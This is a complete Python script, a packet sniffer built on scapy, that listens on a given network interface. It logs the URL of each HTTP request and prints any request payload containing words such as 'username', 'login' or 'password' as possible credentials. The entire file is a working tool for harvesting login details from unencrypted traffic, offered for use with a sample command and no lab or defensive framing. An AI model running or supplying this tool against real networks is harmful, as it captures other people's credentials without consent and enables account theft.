#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              01 December 2020 
* Filename:             packet_sniffer.py
* Example Run (Linux):  python3 packet_sniffer.py -i wlan0
"""

import argparse
import psutil
import scapy.all as scapy
from scapy.layers import http

""" 
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("If your interface is wlan0, then run the script as:")
    print("python3 " + __file__ + " -i wlan0\n")

""" 
* Function Name:  get_packet_sniffer_args()
* Input:          None
* Output:         args.interface (string): The interface from which packets should be sniffed.       
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   interface = get_packet_sniffer_args()
"""
def get_packet_sniffer_args():
    parser = argparse.ArgumentParser()                                  
    parser.add_argument("-i", "--interface", type=str, help="Interface of the device from which packets should be sniffed (required)")

    args = parser.parse_args()

    if(args.interface == None):
        print("\nError: Interface missing!! Pass the interface as an argument to the script.")
        print_sample_usage_msg()

    return args.interface

""" 
* Function Name:  validate_interface()
* Input:          interface (string): The given interface that should be validated.
* Output:         1 if the interface is valid or else 0  
* Logic:          The function checks if the given interface in present in the list of interfaces in the system.
* Example Call:   validate_interface("wlan0")
"""
def validate_interface(interface):
    for i in psutil.net_if_addrs().keys():
        if(i == interface):
            return 1
    return 0

""" 
* Function Name:  sniff()
* Input:          interface (string): The interface that should be sniffed.
* Output:         None
* Logic:          The function is used to sniff packets from the given interface.
* Example Call:   sniff("wlan0")
"""
def sniff(interface):
    print("\nStarting to SNIFF...\n")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

""" 
* Function Name:  get_url()
* Input:          packet (string): The sniffed packet.
* Output:         url (string): The detected URL from the sniffed packet.
* Logic:          The function is used to retrieve the URL from the sniffed packet.
* Example Call:   get_url(packet)
"""
def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode('utf-8')

""" 
* Function Name:  get_login_info()
* Input:          packet (string): The sniffed packet.
* Output:         load (string): The detected possible login information from the sniffed packet.
* Logic:          The function is used to retrieve possible login information from the sniffed packet using a keyword search on the packet.
* Example Call:   get_login_info(packet)
"""
def get_login_info(packet):
    if(packet.haslayer(scapy.Raw)):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ["username", "user", "uname", "login", "email", "password", "pass"]

        if(any(keyword in load for keyword in keywords)):
            return load

""" 
* Function Name:  process_sniffed_packet()
* Input:          packet (string): The sniffed packet.
* Output:         None
* Logic:          The function runs in a continous loop processing each and every sniffed packet in search for URLs and login credentials.
* Example Call:   process_sniffed_packet(packet)
"""
def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        url = get_url(packet)
        print("HTTP Request -> " + url)

        login_info = get_login_info(packet)

        if(login_info != None):
            print("\n\nPossible USERNAME/PASSWORD -> " + login_info + "\n\n")


if __name__ == "__main__":
    interface = get_packet_sniffer_args()

    if(interface != None):
        valid_interface = validate_interface(interface)

        if(valid_interface):
            sniff(interface)

        else:
            if(not valid_interface):
                print("\nERROR: Invalid interface!! Please pass a valid interface.\n")


